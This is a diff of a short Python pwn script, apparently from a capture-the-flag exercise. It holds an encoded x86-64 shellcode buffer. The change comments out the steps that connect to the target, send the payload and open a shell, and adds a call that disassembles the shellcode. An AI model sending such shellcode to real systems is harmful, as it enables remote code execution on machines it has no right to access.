@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import ptrlib as ptr
 import sys
+import pwn
 
 # elf = ptr.ELF("")
 # libc = ptr.ELF("")
@@ -25,7 +26,7 @@ def unwrap(x):
 
 
 def main():
-    io = connect()
+    # io = connect()
     buf = b""
     buf += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d"
     buf += b"\x05\xef\xff\xff\xff\x48\xbb\xd0\xe6\x01\xcd\xfc"
@@ -36,9 +37,11 @@ def main():
     buf += b"\x8e\x01\x9b\xab\x1c\xba\x8a\xeb\xbe\x0e\xc8\xfc"
     buf += b"\x48\xe4\xe0"
 
-    io.sendline(buf.hex())
+    print(pwn.disasm(buf))
 
-    io.sh()
+    # io.sendline(buf.hex())
+
+    # io.sh()
 
 
 if __name__ == "__main__":
